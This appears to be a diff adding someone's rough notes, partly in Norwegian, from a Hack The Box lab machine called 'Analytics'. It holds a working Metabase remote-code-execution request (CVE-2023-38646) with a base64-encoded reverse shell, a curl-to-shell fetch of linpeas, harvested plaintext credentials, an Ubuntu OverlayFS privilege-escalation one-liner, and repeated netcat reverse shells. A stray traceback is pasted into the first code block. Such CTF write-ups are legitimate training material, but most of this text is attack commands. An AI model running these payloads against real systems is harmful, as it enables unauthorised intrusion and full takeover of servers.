@@ -1,0 +1,97 @@
+# Analytics
+
+## Gaining access to the website
+
+```bash
+chaning the hosts file
+sudo vim /etc/hosts
+
+                                                                                                                  │  File "/home/johems/.local/lib/python3.11/site-packages/requests/sessions.py", line 589, in request
+10.129.94.209 analytical.htb data.analytical.htb                                                                                            │    resp = self.send(prep, **send_kwargs)
+
+```
+
+```bash
+┌──(johems㉿BeastJohe)-[~/HB/Analytics/CVE-2023-38646]
+└─$ python3 single.py -u http://data.analytical.htb:80 -c "curl sub.requestcatcher.com/some-endpoint"
+Success get token!
+Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
+Command: curl sub.requestcatcher.com/some-endpoint
+Base64 Encoded Command: Y3VybCBzdWIucmVxdWVzdGNhdGNoZXIuY29tL3NvbWUtZW5kcG9pbnQ
+Exploit success !
+Check on your own to validity!
+
+┌──(johems㉿BeastJohe)-[~/HB/Analytics/CVE-2023-38646]
+```
+
+```bash
+POST /api/setup/validate HTTP/1.1
+Host: data.analytical.htb
+Content-Type: application/json
+Content-Length: 819
+
+{
+    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
+    "details":
+    {
+        "is_on_demand": false,
+        "is_full_sync": false,
+        "is_sample": false,
+        "cache_ttl": null,
+        "refingerprint": false,
+        "auto_run_queries": true,
+        "schedules":
+        {},
+        "details":
+        {
+            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzIvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
+            "advanced-options": false,
+            "ssl": true
+        },
+        "name": "an-sec-research-team",
+        "engine": "h2"
+    }
+}
+
+249fa03d-fd94-4d5b-b94f-b4ebf3df681f
+
+https://www.youtube.com/watch?v=jaSFeZFARKA 
+
+```
+
+```bash
+/tmp $ grep -r "password" sample-database.db.mv.db
+
+/tmp $ strings sample-database.db.mv.db | grep -r "user" 
+
+The city of the accounto owns an account[PEOPLE.CITY.descriptione[PEOPLE.NAME.description
+```
+
+# Python webserver
+
+host/attacker
+sudo python3 -m http.server 80
+
+remote machine 
+curl 10.10.14.32/linpeas.sh | sh
+
+user = META_USER
+password = metalytics
+
+META_USER=metalytics
+META_PASS=An4lytics_ds20223#
+
+ssh metalytics
+
+
+Fant ut maskinen kjørte ubuntu 22.04.2
+
+Fant denne 
+Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629)
+
+metalytics@analytics:/tmp$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
+setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("busybox nc 10.10.14.118 4444 -e /bin/bash")'
+
+
+Denne funker alltid:
+busybox nc 10.10.14.118 4444 -e /bin/bash
